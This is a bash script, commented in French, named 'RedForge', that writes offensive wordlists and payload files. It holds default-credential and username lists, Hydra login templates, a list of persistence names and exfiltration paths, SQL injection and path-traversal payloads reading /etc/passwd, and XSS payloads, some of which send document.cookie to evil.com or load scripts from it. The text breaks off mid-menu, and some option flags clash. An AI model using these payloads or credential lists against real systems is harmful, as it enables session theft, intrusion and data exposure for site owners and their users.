#!/bin/bash
# ========================================
# RedForge - Script de génération de wordlists
# Génère des wordlists personnalisées pour les tests
# Version: 2.0.0 - Support Multi-Attaque & Stealth
# ========================================

set -e

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Bannière
show_banner() {
    echo -e "${CYAN}"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════════╗
║         RedForge - Générateur de wordlists v2.0                  ║
║        Support Multi-Attaque & Mode Furtif (Stealth)             ║
╚══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# Configuration
WORDLIST_DIR="${HOME}/.RedForge/wordlists"
TEMP_DIR="/tmp/redforge_wordlists"
LOG_FILE="${WORDLIST_DIR}/generation.log"
MAX_FILE_SIZE=100  # MB

# Nouvelles sections
STEALTH_WORDLISTS_DIR="${WORDLIST_DIR}/stealth"
MULTI_ATTACK_WORDLISTS_DIR="${WORDLIST_DIR}/multi_attack"
APT_WORDLISTS_DIR="${WORDLIST_DIR}/apt"

# Fonctions
print_status() { echo -e "${BLUE}[*]${NC} $1"; }
print_success() { echo -e "${GREEN}[+]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
print_error() { echo -e "${RED}[-]${NC} $1"; }
print_info() { echo -e "${MAGENTA}[i]${NC} $1"; }

# Logger
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Créer les répertoires
init_dirs() {
    print_status "Création des répertoires..."
    mkdir -p "$WORDLIST_DIR"/{passwords,usernames,directories,subdomains,custom,api,lfi,ssrf,xxe}
    mkdir -p "$STEALTH_WORDLISTS_DIR"
    mkdir -p "$MULTI_ATTACK_WORDLISTS_DIR"
    mkdir -p "$APT_WORDLISTS_DIR"
    mkdir -p "$TEMP_DIR"
    print_success "Répertoires créés"
    log_message "Répertoires initialisés"
}

# Vérifier l'espace disque
check_disk_space() {
    local required_mb=$1
    local available_mb=$(df "$WORDLIST_DIR" | awk 'NR==2 {print $4}' | sed 's/[^0-9]//g')
    available_mb=$((available_mb / 1024))
    
    if [ $available_mb -lt $required_mb ]; then
        print_error "Espace disque insuffisant. Requis: ${required_mb}MB, Disponible: ${available_mb}MB"
        return 1
    fi
    return 0
}

# Générer des mots de passe furtifs (Stealth)
generate_stealth_passwords() {
    local output="$STEALTH_WORDLISTS_DIR/stealth_passwords.txt"
    
    print_status "Génération de mots de passe furtifs (Stealth)..."
    
    {
        # Mots de passe courts et communs (difficiles à détecter)
        echo "pass"
        echo "pass123"
        echo "admin"
        echo "user"
        echo "test"
        echo "guest"
        echo "123456"
        echo "password"
        echo "qwerty"
        echo "abc123"
        echo "welcome"
        echo "letmein"
        echo "monkey"
        echo "dragon"
        echo "master"
        echo "shadow"
        
        # Mots de passe avec variantes Leet
        echo "p4ss"
        echo "adm1n"
        echo "us3r"
        echo "t3st"
        echo "gu3st"
        echo "w3lc0me"
        echo "l3tm31n"
        
        # Mots de passe avec années récentes
        for year in {2023..2025}; do
            echo "pass${year}"
            echo "admin${year}"
            echo "user${year}"
            echo "test${year}"
        done
        
    } > "$output"
    
    local line_count=$(wc -l < "$output")
    print_success "Wordlist furtive générée: $output ($line_count entrées)"
    log_message "Généré wordlist furtive ($line_count entrées)"
}

# Générer des wordlists pour attaques multiples
generate_multi_attack_wordlist() {
    local output="$MULTI_ATTACK_WORDLISTS_DIR/multi_attack_combined.txt"
    
    print_status "Génération de wordlist pour attaques multiples..."
    
    {
        # Combinaisons pour attaques parallèles
        echo "admin admin"
        echo "admin password"
        echo "root root"
        echo "root toor"
        echo "user user"
        echo "user password"
        echo "test test"
        
        # Paires username:password
        for user in "admin" "root" "user" "test" "guest"; do
            for pass in "password" "123456" "admin" "qwerty" "letmein"; do
                echo "${user}:${pass}"
            done
        done
        
        # Format pour hydra
        for user in "admin" "root" "user"; do
            echo "login=${user}&password=^PASS^"
        done
        
    } > "$output"
    
    local line_count=$(wc -l < "$output")
    print_success "Wordlist multi-attaque générée: $output ($line_count entrées)"
    log_message "Généré wordlist multi-attaque ($line_count entrées)"
}

# Générer des wordlists APT
generate_apt_wordlist() {
    local output="$APT_WORDLISTS_DIR/apt_wordlist.txt"
    
    print_status "Génération de wordlist APT..."
    
    {
        # Mots de passe pour persistance
        echo "backdoor"
        echo "persist"
        echo "rootkit"
        echo "malware"
        echo "exploit"
        echo "shellcode"
        echo "payload"
        echo "beacon"
        echo "c2"
        echo "exfil"
        
        # Noms de services pour persistance
        echo "updater"
        echo "systemhelper"
        echo "securityservice"
        echo "antivirus"
        echo "firewall"
        echo "backupagent"
        echo "syncservice"
        echo "monitor"
        
        # Clés SSH
        echo "id_rsa"
        echo "id_dsa"
        echo "authorized_keys"
        echo "known_hosts"
        echo "ssh_config"
        
        # Chemins pour exfiltration
        echo "/tmp/exfil"
        echo "/var/tmp/data"
        echo "/dev/shm/cache"
        echo "/var/log/system"
        echo "/var/www/html/uploads"
        
    } > "$output"
    
    local line_count=$(wc -l < "$output")
    print_success "Wordlist APT générée: $output ($line_count entrées)"
    log_message "Généré wordlist APT ($line_count entrées)"
}

# Générer des payloads XSS furtifs
generate_stealth_xss_wordlist() {
    local output="$STEALTH_WORDLISTS_DIR/stealth_xss_payloads.txt"
    
    print_status "Génération de payloads XSS furtifs..."
    
    cat > "$output" << 'EOF'
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body/onload=alert(1)>
<input/onfocus=alert(1) autofocus>
<iframe/src="javascript:alert(1)">
<a/href="javascript:alert(1)">click</a>
<div/onmouseover="alert(1)">hover</div>
javascript:alert(1)
"><script>alert(1)</script>
'><script>alert(1)</script>
</script><script>alert(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
<ScRiPt>alert(1)</ScRiPt>
%3Cscript%3Ealert(1)%3C/script%3E
<svg/onload=fetch('//evil.com/steal?c='+document.cookie)>
<img/src/onerror=fetch('//evil.com/steal?c='+document.cookie)>
<script>fetch('//evil.com/steal?c='+document.cookie)</script>
EOF
    
    local line_count=$(wc -l < "$output")
    print_success "Wordlist XSS furtive générée: $output ($line_count entrées)"
    log_message "Généré wordlist XSS furtive ($line_count entrées)"
}

# Générer des payloads SQL furtifs
generate_stealth_sql_wordlist() {
    local output="$STEALTH_WORDLISTS_DIR/stealth_sql_payloads.txt"
    
    print_status "Génération de payloads SQL furtifs..."
    
    cat > "$output" << 'EOF'
' OR '1'='1
' OR 1=1--
' OR 1=1#
' AND 1=1--
' AND 1=2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' AND SLEEP(1)--
' OR SLEEP(1)--
' AND (SELECT SLEEP(1))--
' OR (SELECT SLEEP(1))--
' AND BENCHMARK(100000,MD5('x'))--
' OR BENCHMARK(100000,MD5('x'))--
' AND extractvalue(1,concat(0x7e,database()))--
' AND updatexml(1,concat(0x7e,database()),1)--
EOF
    
    local line_count=$(wc -l < "$output")
    print_success "Wordlist SQL furtive générée: $output ($line_count entrées)"
    log_message "Généré wordlist SQL furtive ($line_count entrées)"
}

# Générer des mots de passe basés sur des mots-clés
generate_password_wordlist() {
    local keyword="$1"
    local output="$WORDLIST_DIR/passwords/${keyword}_passwords.txt"
    
    print_status "Génération de mots de passe basés sur: $keyword"
    
    {
        # Variations de base
        echo "$keyword"
        echo "${keyword}123"
        echo "${keyword}123!"
        echo "${keyword}2023"
        echo "${keyword}2024"
        echo "${keyword}2025"
        echo "${keyword}@2023"
        echo "${keyword}@2024"
        echo "${keyword}@2025"
        echo "${keyword}!"
        echo "${keyword}!!"
        echo "${keyword}123456"
        echo "${keyword}admin"
        echo "admin${keyword}"
        echo "${keyword}pass"
        echo "pass${keyword}"
        echo "${keyword}root"
        echo "root${keyword}"
        
        # Avec majuscules
        echo "${keyword^}"
        echo "${keyword^^}"
        echo "${keyword^}123"
        echo "${keyword^^}123"
        echo "${keyword^}!"
        echo "${keyword^^}!"
        
        # Avec caractères spéciaux
        echo "${keyword}@"
        echo "${keyword}#"
        echo "${keyword}$"
        echo "${keyword}%"
        echo "${keyword}&"
        echo "${keyword}@123"
        echo "${keyword}#123"
        echo "${keyword}$123"
        echo "${keyword}%123"
        echo "${keyword}&123"
        
        # Combinaisons communes
        echo "${keyword}123!"
        echo "${keyword}2023!"
        echo "${keyword}2024!"
        echo "${keyword}2025!"
        echo "${keyword}Admin"
        echo "Admin${keyword}"
        echo "Admin${keyword}123"
        echo "${keyword}Admin123"
        
        # Leet speak
        echo "${keyword}" | sed -e 's/a/@/g' -e 's/e/3/g' -e 's/i/1/g' -e 's/o/0/g' -e 's/s/5/g'
        echo "${keyword}123" | sed -e 's/a/@/g' -e 's/e/3/g' -e 's/i/1/g' -e 's/o/0/g' -e 's/s/5/g'
        
        # Avec l'année
        for year in {2020..2030}; do
            echo "${keyword}${year}"
            echo "${keyword}${year}!"
            echo "${year}${keyword}"
            echo "${keyword}@${year}"
            echo "${keyword}#${year}"
        done
        
        # Avec des chiffres aléatoires
        for i in {0..99}; do
            printf "%s%02d\n" "$keyword" "$i"
            printf "%s%02d!\n" "$keyword" "$i"
            printf "%s%03d\n" "$keyword" "$i"
            printf "%s%03d!\n" "$keyword" "$i"
        done
        
        # Avec des mots de saison
        for season in "Spring" "Summer" "Fall" "Winter" "Printemps" "Ete" "Automne" "Hiver"; do
            echo "${keyword}${season}"
            echo "${keyword}${season}2024"
            echo "${season}${keyword}"
            echo "${season}${keyword}2024"
        done
        
    } > "$output"
    
    local line_count=$(wc -l < "$output")
    print_success "Wordlist générée: $output ($line_count entrées)"
    log_message "Généré wordlist mots de passe: $keyword ($line_count entrées)"
}

# Générer des noms d'utilisateur
generate_username_wordlist() {
    local company="$1"
    local output="$WORDLIST_DIR/usernames/${company}_usernames.txt"
    
    print_status "Génération de noms d'utilisateur pour: $company"
    
    {
        # Formats courants
        echo "admin"
        echo "administrator"
        echo "root"
        echo "user"
        echo "test"
        echo "guest"
        echo "service"
        echo "$company"
        echo "${company}admin"
        echo "admin${company}"
        echo "${company}user"
        echo "user${company}"
        echo "${company}service"
        echo "service${company}"
        
        # Avec prénoms communs
        for first in "john" "jane" "bob" "alice" "admin" "support" "info" "contact" "webmaster" "security" "it" "helpdesk"; do
            echo "${first}"
            echo "${first}@${company}"
            echo "${first}.${company}"
            echo "${first}_${company}"
            echo "${first}${company}"
            echo "${company}${first}"
            echo "${first}.${company}.com"
            echo "${first}@${company}.com"
        done
        
        # Formats email
        echo "admin@${company}.com"
        echo "contact@${company}.com"
        echo "info@${company}.com"
        echo "support@${company}.com"
        echo "webmaster@${company}.com"
        echo "security@${company}.com"
        echo "it@${company}.com"
        echo "helpdesk@${company}.com"
        echo "noreply@${company}.com"
        echo "no-reply@${company}.com"
        
        # Avec départements
        for dept in "it" "hr" "sales" "marketing" "finance" "legal" "security" "support" "dev" "ops" "admin"; do
            echo "${dept}"
            echo "${dept}@${company}.com"
            echo "${company}${dept}"
            echo "${dept}${company}"
            echo "${dept}.${company}.com"
        done
        
        # Formats avec initiales
        for first in "j" "a" "m" "s" "d" "r" "p"; do
            for last in "smith" "doe" "admin" "user" "test"; do
                echo "${first}${last}"
                echo "${first}.${last}"
                echo "${first}_${last}"
                echo "${last}${first}"
                echo "${first}${last}@${company}.com"
            done
        done
        
    } > "$output"
    
    local line_count=$(wc -l < "$output")
    print_success "Wordlist générée: $output ($line_count entrées)"
    log_message "Généré wordlist utilisateurs: $company ($line_count entrées)"
}

# Générer des wordlists de répertoires
generate_directory_wordlist() {
    local output="$WORDLIST_DIR/directories/common_directories.txt"
    
    print_status "Génération de wordlist de répertoires..."
    
    {
        # Admin et gestion
        echo "admin"
        echo "administrator"
        echo "manage"
        echo "management"
        echo "dashboard"
        echo "console"
        echo "control"
        echo "controlpanel"
        echo "cpanel"
        echo "webadmin"
        echo "siteadmin"
        echo "sysadmin"
        echo "itadmin"
        
        # API et services
        echo "api"
        echo "rest"
        echo "graphql"
        echo "soap"
        echo "webservice"
        echo "service"
        echo "services"
        echo "v1"
        echo "v2"
        echo "v3"
        echo "v4"
        echo "v5"
        
        # Fichiers de configuration
        echo "config"
        echo "configuration"
        echo "settings"
        echo "preferences"
        echo "options"
        echo "ini"
        echo "conf"
        echo "cfg"
        echo "env"
        echo "properties"
        
        # Fichiers sensibles
        echo ".git"
        echo ".svn"
        echo ".hg"
        echo ".bzr"
        echo ".env"
        echo ".htaccess"
        echo ".htpasswd"
        echo "web.config"
        echo "app.config"
        echo "application.yml"
        echo "application.properties"
        
        # Backups
        echo "backup"
        echo "backups"
        echo "old"
        echo "temp"
        echo "tmp"
        echo "cache"
        echo "logs"
        echo "log"
        echo "archive"
        echo "archives"
        
        # Uploads et fichiers
        echo "upload"
        echo "uploads"
        echo "download"
        echo "downloads"
        echo "files"
        echo "media"
        echo "images"
        echo "img"
        echo "css"
        echo "js"
        echo "fonts"
        echo "assets"
        echo "static"
        echo "public"
        echo "resources"
        
        # CMS spécifiques
        echo "wp-admin"
        echo "wp-content"
        echo "wp-includes"
        echo "administrator"
        echo "components"
        echo "modules"
        echo "plugins"
        echo "themes"
        echo "joomla"
        echo "drupal"
        echo "magento"
        echo "prestashop"
        
        # Développement
        echo "dev"
        echo "development"
        echo "staging"
        echo "stage"
        echo "test"
        echo "testing"
        echo "qa"
        echo "demo"
        echo "sandbox"
        echo "local"
        
    } > "$output"
    
    local line_count=$(wc -l < "$output")
    print_success "Wordlist générée: $output ($line_count entrées)"
    log_message "Généré wordlist répertoires ($line_count entrées)"
}

# Générer des wordlists de sous-domaines
generate_subdomain_wordlist() {
    local output="$WORDLIST_DIR/subdomains/common_subdomains.txt"
    
    print_status "Génération de wordlist de sous-domaines..."
    
    {
        # Sous-domaines courants
        echo "www"
        echo "mail"
        echo "ftp"
        echo "smtp"
        echo "pop"
        echo "pop3"
        echo "imap"
        echo "ns1"
        echo "ns2"
        echo "ns3"
        echo "dns"
        echo "dns1"
        echo "dns2"
        echo "mx"
        echo "mx1"
        echo "mx2"
        
        # Administration
        echo "admin"
        echo "administrator"
        echo "manage"
        echo "manager"
        echo "dashboard"
        echo "console"
        echo "control"
        echo "cpanel"
        echo "webmail"
        echo "webdisk"
        echo "whm"
        echo "cpanel"
        echo "plesk"
        echo "directadmin"
        
        # Développement
        echo "dev"
        echo "development"
        echo "test"
        echo "testing"
        echo "staging"
        echo "stage"
        echo "qa"
        echo "demo"
        echo "sandbox"
        echo "local"
        echo "beta"
        echo "alpha"
        echo "preprod"
        echo "preproduction"
        
        # Services
        echo "api"
        echo "rest"
        echo "graphql"
        echo "soap"
        echo "auth"
        echo "login"
        echo "account"
        echo "portal"
        echo "app"
        echo "apps"
        echo "cloud"
        echo "sso"
        echo "oauth"
        echo "identity"
        
        # Infrastructure
        echo "monitor"
        echo "monitoring"
        echo "metrics"
        echo "logs"
        echo "log"
        echo "backup"
        echo "storage"
        echo "cdn"
        echo "static"
        echo "media"
        echo "cache"
        echo "proxy"
        echo "gateway"
        echo "router"
        echo "firewall"
        
        # Sécurité
        echo "vpn"
        echo "secure"
        echo "security"
        echo "firewall"
        echo "proxy"
        echo "gateway"
        echo "waf"
        echo "ids"
        echo "ips"
        echo "siem"
        
        # Business
        echo "shop"
        echo "store"
        echo "checkout"
        echo "payment"
        echo "billing"
        echo "invoice"
        echo "order"
        echo "cart"
        echo "product"
        echo "catalog"
        echo "search"
        
    } > "$output"
    
    local line_count=$(wc -l < "$output")
    print_success "Wordlist générée: $output ($line_count entrées)"
    log_message "Généré wordlist sous-domaines ($line_count entrées)"
}

# Générer des payloads XSS
generate_xss_wordlist() {
    local output="$WORDLIST_DIR/xss_payloads.txt"
    
    print_status "Génération de payloads XSS..."
    
    cat > "$output" << 'EOF'
<script>alert('XSS')</script>
<script>alert("XSS")</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<iframe src="javascript:alert('XSS')">
<a href="javascript:alert('XSS')">click</a>
<div onmouseover="alert('XSS')">hover</div>
javascript:alert('XSS')
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
</script><script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<ScRiPt>alert('XSS')</ScRiPt>
%3Cscript%3Ealert('XSS')%3C/script%3E
<svg/onload=alert('XSS')>
<image src/onerror=alert('XSS')>
<video src/onerror=alert('XSS')>
<audio src/onerror=alert('XSS')>
<math href="javascript:alert('XSS')">XSS</math>
<isindex type=image src=1 onerror=alert('XSS')>
<SCRIPT>alert(/XSS/.source)</SCRIPT>
<BODY ONLOAD=alert('XSS')>
<IMG SRC=javascript:alert('XSS')>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<OBJECT TYPE="text/x-scriptlet" DATA="http://evil.com/xss.html"></OBJECT>
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<STYLE>@import'javascript:alert("XSS")';</STYLE>
<XSS STYLE="behavior: url(xss.htc);">
<? echo('<script>alert("XSS")</script>'); ?>
<! [CDATA[<script>alert('XSS')</script>]]>
<!--#exec cmd="echo '<script>alert(\"XSS\")</script>'" -->
<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>
<IMG SRC="http://evil.com/xss.js">
<IFRAME SRC="http://evil.com/xss.html">
EOF
    
    local line_count=$(wc -l < "$output")
    print_success "Wordlist générée: $output ($line_count entrées)"
    log_message "Généré wordlist XSS ($line_count entrées)"
}

# Générer des payloads SQL
generate_sql_wordlist() {
    local output="$WORDLIST_DIR/sql_payloads.txt"
    
    print_status "Génération de payloads SQL..."
    
    cat > "$output" << 'EOF'
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR '1'='1' /*
" OR "1"="1
" OR "1"="1" --
" OR "1"="1" #
" OR "1"="1" /*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
' OR 1=1;--
' OR 1=1;#
' OR 1=1;/*
' AND '1'='1
' AND '1'='2
' AND 1=1--
' AND 1=2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT version(),user(),database()--
' AND SLEEP(5)--
' AND SLEEP(5) AND '1'='1
' AND SLEEP(5) AND '1'='2
' OR SLEEP(5)--
' OR SLEEP(5) AND '1'='1
' OR SLEEP(5) AND '1'='2
' AND (SELECT SLEEP(5))--
' OR (SELECT SLEEP(5))--
' AND BENCHMARK(1000000,MD5('test'))--
' OR BENCHMARK(1000000,MD5('test'))--
' AND extractvalue(1,concat(0x7e,database()))--
' AND updatexml(1,concat(0x7e,database()),1)--
' AND 1=1 WAITFOR DELAY '0:0:5'--
' AND 1=1 WAITFOR DELAY '0:0:5';--
' AND pg_sleep(5)--
' AND 1=1 AND pg_sleep(5)--
' AND 1=2 AND pg_sleep(5)--
' AND 1=1 AND (SELECT pg_sleep(5))--
EOF
    
    local line_count=$(wc -l < "$output")
    print_success "Wordlist générée: $output ($line_count entrées)"
    log_message "Généré wordlist SQL ($line_count entrées)"
}

# Générer des payloads LFI
generate_lfi_wordlist() {
    local output="$WORDLIST_DIR/lfi_payloads.txt"
    
    print_status "Génération de payloads LFI/RFI..."
    
    cat > "$output" << 'EOF'
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
....//....//....//etc/passwd
....//....//....//....//etc/passwd
..;/..;/..;/etc/passwd
..;/..;/..;/..;/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252f..%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..\\..\\..\\windows\\win.ini
..\\..\\..\\..\\windows\\win.ini
..\\..\\..\\..\\..\\windows\\win.ini
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/convert.base64-encode/resource=../../config.php
expect://id
file:///etc/passwd
file:///C:/windows/win.ini
/var/log/apache2/access.log
/var/log/nginx/access.log
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
EOF
    
    local line_count=$(wc -l < "$output")
    print_success "Wordlist générée: $output ($line_count entrées)"
    log_message "Généré wordlist LFI ($line_count entrées)"
}

# Télécharger des wordlists externes
download_external_wordlists() {
    print_status "Téléchargement des wordlists externes..."
    
    # Vérifier l'espace disque (500 MB requis)
    if ! check_disk_space 500; then
        print_warning "Espace disque insuffisant, téléchargement ignoré"
        return 1
    fi
    
    # SecLists
    SECLISTS_URL="https://github.com/danielmiessler/SecLists/archive/master.zip"
    SECLISTS_ZIP="$TEMP_DIR/SecLists.zip"
    
    if command -v wget &> /dev/null; then
        print_info "Téléchargement de SecLists (cela peut prendre quelques minutes)..."
        wget -q --show-progress "$SECLISTS_URL" -O "$SECLISTS_ZIP" && {
            print_info "Extraction de SecLists..."
            unzip -q "$SECLISTS_ZIP" -d "$TEMP_DIR/"
            
            # Copier les wordlists utiles
            cp "$TEMP_DIR/SecLists-master/Passwords/Common-Credentials/10k-most-common.txt" \
               "$WORDLIST_DIR/passwords/10k_common_passwords.txt" 2>/dev/null && \
               print_success "10k_common_passwords.txt téléchargé"
            
            cp "$TEMP_DIR/SecLists-master/Usernames/top-usernames-shortlist.txt" \
               "$WORDLIST_DIR/usernames/top_usernames.txt" 2>/dev/null && \
               print_success "top_usernames.txt téléchargé"
            
            cp "$TEMP_DIR/SecLists-master/Discovery/Web-Content/common.txt" \
               "$WORDLIST_DIR/directories/common_web.txt" 2>/dev/null && \
               print_success "common_web.txt téléchargé"
            
            cp "$TEMP_DIR/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt" \
               "$WORDLIST_DIR/subdomains/top_subdomains.txt" 2>/dev/null && \
               print_success "top_subdomains.txt téléchargé"
            
            cp "$TEMP_DIR/SecLists-master/Discovery/Web-Content/burp-parameter-names.txt" \
               "$WORDLIST_DIR/parameters/burp_parameters.txt" 2>/dev/null && \
               print_success "burp_parameters.txt téléchargé"
            
            print_success "Wordlists SecLists téléchargées"
            log_message "Wordlists SecLists téléchargées"
        } || print_warning "Impossible de télécharger SecLists"
    else
        print_warning "wget non installé, impossible de télécharger les wordlists externes"
    fi
}

# Fusionner des wordlists
merge_wordlists() {
    local output="$WORDLIST_DIR/custom/merged_wordlist.txt"
    
    print_status "Fusion des wordlists..."
    
    {
        cat "$WORDLIST_DIR"/passwords/*.txt 2>/dev/null
        cat "$WORDLIST_DIR"/usernames/*.txt 2>/dev/null
        cat "$WORDLIST_DIR"/directories/*.txt 2>/dev/null
        cat "$WORDLIST_DIR"/subdomains/*.txt 2>/dev/null
        cat "$STEALTH_WORDLISTS_DIR"/*.txt 2>/dev/null
        cat "$MULTI_ATTACK_WORDLISTS_DIR"/*.txt 2>/dev/null
        cat "$APT_WORDLISTS_DIR"/*.txt 2>/dev/null
    } | sort -u > "$output"
    
    local line_count=$(wc -l < "$output")
    print_success "Wordlist fusionnée: $output ($line_count entrées)"
    log_message "Wordlists fusionnées ($line_count entrées)"
}

# Nettoyer les doublons
deduplicate_wordlists() {
    print_status "Nettoyage des doublons dans les wordlists..."
    
    local total_before=0
    local total_after=0
    
    for dir in passwords usernames directories subdomains custom stealth multi_attack apt; do
        dir_path="$WORDLIST_DIR/$dir"
        if [ -d "$dir_path" ]; then
            for file in "$dir_path"/*.txt; do
                if [ -f "$file" ]; then
                    before=$(wc -l < "$file")
                    total_before=$((total_before + before))
                    
                    sort -u "$file" -o "$file"
                    
                    after=$(wc -l < "$file")
                    total_after=$((total_after + after))
                    
                    local removed=$((before - after))
                    if [ $removed -gt 0 ]; then
                        print_success "Nettoyé: $file ($removed doublons supprimés)"
                    fi
                fi
            done
        fi
    done
    
    local total_removed=$((total_before - total_after))
    print_success "Nettoyage terminé ($total_removed doublons supprimés au total)"
    log_message "Dédoublonnage terminé: $total_removed doublons supprimés"
}

# Afficher les statistiques
show_stats() {
    echo ""
    echo "=========================================="
    echo "📊 Statistiques des wordlists"
    echo "=========================================="
    
    local total_entrees=0
    local total_fichiers=0
    
    for dir in passwords usernames directories subdomains custom api lfi ssrf xxe stealth multi_attack apt; do
        dir_path="$WORDLIST_DIR/$dir"
        if [ -d "$dir_path" ]; then
            local count=$(find "$dir_path" -name "*.txt" -exec wc -l {} \; 2>/dev/null | awk '{sum+=$1} END {print sum+0}')
            local files=$(ls -1 "$dir_path"/*.txt 2>/dev/null | wc -l)
            
            if [ "$count" -gt 0 ]; then
                echo "$dir: $files fichiers, $(printf "%'d" $count) entrées"
                total_entrees=$((total_entrees + count))
                total_fichiers=$((total_fichiers + files))
            fi
        fi
    done
    
    echo "------------------------------------------"
    echo "TOTAL: $total_fichiers fichiers, $(printf "%'d" $total_entrees) entrées"
    
    # Espace disque utilisé
    local disk_usage=$(du -sh "$WORDLIST_DIR" | cut -f1)
    echo "Espace utilisé: $disk_usage"
    echo "=========================================="
}

# Menu principal
show_menu() {
    echo ""
    echo "=========================================="
    echo "🔧 RedForge - Générateur de wordlists v2.0"
    echo "=========================================="
    echo "1. 📦 Générer toutes les wordlists"
    echo "2. 🕵️ Générer wordlists furtives (Stealth)"
    echo "3. 🎯 Générer wordlists multi-attaque"
    echo "4. 🚀 Générer wordlists APT"
    echo "5. 🔑 Générer wordlist de mots de passe"
    echo "6. 👤 Générer wordlist d'utilisateurs"
    echo "7. 📁 Générer wordlist de répertoires"
    echo "8. 🌐 Générer wordlist de sous-domaines"
    echo "9. 💉 Générer payloads XSS"
    echo "10. 🗄️ Générer payloads SQL"
    echo "11. 📄 Générer payloads LFI/RFI"
    echo "12. 📥 Télécharger wordlists externes"
    echo "13. 🔄 Fusionner les wordlists"
    echo "14. 🧹 Nettoyer les doublons"
    echo "15. 📊 Afficher les statistiques"
    echo "16. ❌ Quitter"
    echo "=========================================="
    read -p "Votre choix [1-16]: " choice
}

# Main
main() {
    show_banner
    init_dirs
    
    if [ $# -gt 0 ]; then
        case "$1" in
            --all|-a)
                generate_directory_wordlist
                generate_subdomain_wordlist
                generate_xss_wordlist
                generate_sql_wordlist
                generate_lfi_wordlist
                generate_stealth_passwords
                generate_stealth_xss_wordlist
                generate_stealth_sql_wordlist
                generate_multi_attack_wordlist
                generate_apt_wordlist
                download_external_wordlists
                deduplicate_wordlists
                show_stats
                ;;
            --stealth|-st)
                generate_stealth_passwords
                generate_stealth_xss_wordlist
                generate_stealth_sql_wordlist
                ;;
            --multi|-m)
                generate_multi_attack_wordlist
                ;;
            --apt|-a)
                generate_apt_wordlist
                ;;
            --passwords|-p)
                read -p "Mot-clé pour les mots de passe: " keyword
                generate_password_wordlist "$keyword"
                ;;
            --usernames|-u)
                read -p "Nom de l'entreprise: " company
                generate_username_wordlist "$company"
                ;;
            --directories|-d)
                generate_directory_wordlist
                ;;
            --subdomains|-s)
                generate_subdomain_wordlist
                ;;
            --xss|-x)
                generate_xss_wordlist
                ;;
            --sql|-q)
                generate_sql_wordlist
                ;;
            --lfi|-l)
                generate_lfi_wordlist
                ;;
            --download|-dl)
                download_external_wordlists
                ;;
            --merge|-mrg)
                merge_wordlists
                ;;
            --clean|-c)
                deduplicate_wordlists
                ;;
            --stats|-st)
                show_stats
                ;;
            --help|-h)
                echo "Usage: $0 [OPTIONS]"
                echo ""
                echo "Options:"
                echo "  --all, -a           Générer toutes les wordlists"
                echo "  --stealth, -st      Générer wordlists furtives (Stealth)"
                echo "  --multi, -m         Générer wordlists multi-attaque"
                echo "  --apt, -a           Générer wordlists APT"
                echo "  --passwords, -p     Générer wordlist de mots de passe"
                echo "  --usernames, -u     Générer wordlist d'utilisateurs"
                echo "  --directories, -d   Générer wordlist de répertoires"
                echo "  --subdomains, -s    Générer wordlist de sous-domaines"
                echo "  --xss, -x           Générer payloads XSS"
                echo "  --sql, -q           Générer payloads SQL"
                echo "  --lfi, -l           Générer payloads LFI/RFI"
                echo "  --download, -dl     Télécharger wordlists externes"
                echo "  --merge, -mrg       Fusionner les wordlists"
                echo "  --clean, -c         Nettoyer les doublons"
                echo "  --stats, -st        Afficher les statistiques"
                echo "  --help, -h          Afficher cette aide"
                echo ""
                echo "Exemples:"
                echo "  $0 --all                    # Générer toutes les wordlists"
                echo "  $0 --stealth               # Générer wordlists furtives"
                echo "  $0 --multi                 # Générer wordlists multi-attaque"
                echo "  $0 --apt                   # Générer wordlists APT"
                echo "  $0 --passwords mycompany   # Générer mots de passe pour mycompany"
                echo "  $0 --download              # Télécharger wordlists externes"
                exit 0
                ;;
            *)
                print_error "Option inconnue: $1"
                exit 1
                ;;
        esac
    else
        while true; do
            show_menu
            case $choice in
                1)
                    generate_directory_wordlist
                    generate_subdomain_wordlist
                    generate_xss_wordlist
                    generate_sql_wordlist
                    generate_lfi_wordlist
                    generate_stealth_passwords
                    generate_stealth_xss_wordlist
                    generate_stealth_sql_wordlist
                    generate_multi_attack_wordlist
                    generate_apt_wordlist
                    download_external_wordlists
                    deduplicate_wordlists
                    show_stats
                    break
                    ;;
                2)
                    generate_stealth_passwords
                    generate_stealth_xss_wordlist
                    generate_stealth_sql_wordlist
                    ;;
                3)
                    generate_multi_attack_wordlist
                    ;;
                4)
                    generate_apt_wordlist
                    ;;
                5)
                    read -p "Mot-clé pour les mots de passe: " keyword
